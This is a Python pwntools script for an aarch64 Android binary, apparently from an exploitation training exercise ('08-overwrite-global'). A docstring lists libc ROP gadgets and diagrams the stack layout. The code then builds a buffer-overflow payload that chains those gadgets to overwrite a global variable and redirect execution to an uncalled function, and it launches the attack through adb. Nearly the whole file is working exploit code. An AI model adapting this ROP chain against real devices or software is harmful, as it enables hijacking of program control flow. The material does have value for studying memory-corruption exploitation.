#!/usr/bin/python

'''
Gadgets:
    0x0009bcd0: ldp x29, x30, [sp, #0x20]; ldp x20, x19, [sp, #0x10]; ldp x22, x21, [sp], #0x30; ret;
    0x000779c4: mov x0, x21; blr x20;
    0x00041538: str x0, [x19]; ldp x29, x30, [sp, #0x10]; ldr x19, [sp], #0x20; ret;

Stack:
            0x8: not_called
x30         ----
            0x18
unused      ----
            0x8: gg2
x30         ----
            0x8
x29         ----
            0x8: x_addr
x19         ----
            0x8: gg3
x20         ----
            0x8: x_value
x21         ----
            0x8
x22         ----        <- gg1_sp
            0x8: gg1
x30         ----
            0x8
x29         ----
            0x80
buffer      ----
            0x20
            ----        <- vul_sp
'''

from pwn import *

context(arch='aarch64', endian='little', word_size=64, os='android')

bin_addr = 0x5555555000
x_addr = bin_addr + 0x11008
not_called = bin_addr + 0x8b8

libc_addr = 0x7fbf3c1000
gg1 = libc_addr + 0x9bcd0
gg2 = libc_addr + 0x779c4
gg3 = libc_addr + 0x41538

x_value = 0xdeadbabebeefc0de

payload = 'a' * 0x88
payload += p64(gg1)
payload += 'a' * 8
payload += p64(x_value)
payload += p64(gg3)
payload += p64(x_addr)
payload += 'a' * 8
payload += p64(gg2)
payload += 'a' * 0x18
payload += p64(not_called)

bin_path = '/data/local/tmp/08-overwrite-global'
proc = adb.process([bin_path])
proc.recvuntil('> ')
proc.send(payload)
proc.interactive()
